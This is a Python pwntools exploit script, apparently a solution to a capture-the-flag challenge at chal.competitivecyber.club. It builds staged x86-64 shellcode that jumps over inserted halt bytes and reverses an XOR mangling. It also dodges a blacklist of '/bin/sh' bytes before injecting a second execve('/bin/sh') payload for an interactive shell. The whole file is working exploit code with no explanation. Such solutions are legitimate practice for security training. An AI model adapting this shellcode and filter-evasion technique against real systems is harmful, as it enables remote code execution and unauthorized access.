#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        #log_level="debug",
        log_level="info",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "chal.competitivecyber.club"
PORT = 3004

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)


def mangle_shellcode(shellcode):
    shellcode = bytearray(shellcode)
    shell_len = len(shellcode)
    index = (shell_len - 2) // 4 * 4  

    # Reverse the mangle operation by XORing backwards
    while index >= 0:
        shellcode[index] ^= shellcode[index + 1]
        index -= 4

    log.info(f"Mangled shellcode {shellcode}")
    blacklist = [b"\x68", b"\x6e", b"\x73", b"\x2f", b"\x69", b"\x62", b"\x3b", b"\x00"] 

    for b in shellcode: 
        if b in blacklist:
            log.info(f"Invalid shellcode for {b}")
            return bytes(0)
 
    return bytes(shellcode)


def exploit(p,e):
    # Relative jmp 4 to jmp over four hlt instructions
    jmp_4 = b"\xeb\x04"
    
    # Some random filler that will be replaced with 0xf4f4f4f4
    filler = b"\xf4\x90\xf4\x90"

    # Call read(0, &buf, 0x200)
    shellcode =  jmp_4 + filler + asm("xchg rdx, rsi") + asm("xor rdi,rdi")
    shellcode += jmp_4 + filler + asm("add rsi, 0x20") + asm("nop") + asm("nop")
    shellcode += jmp_4 + filler + asm("xchg r11, rdx") + asm("syscall")    

    # execve("/bin/sh", 0, 0)
    easy_shellcode = asm("""
        movabs r15, 0x68732f6e69622f 
        push r15
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov eax, 0x3b
        syscall
    """)
         
    mangled_shellcode = mangle_shellcode(shellcode)
     
    log.info(f"Shellcode {shellcode} {len(shellcode)}")
    log.info(f"Mangled shellcode {mangled_shellcode}")

    sl(p,mangled_shellcode)
    #sl(p,shellcode)
    
    pause()

    sl(p, b"\x90"*0x30 + easy_shellcode)


    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)
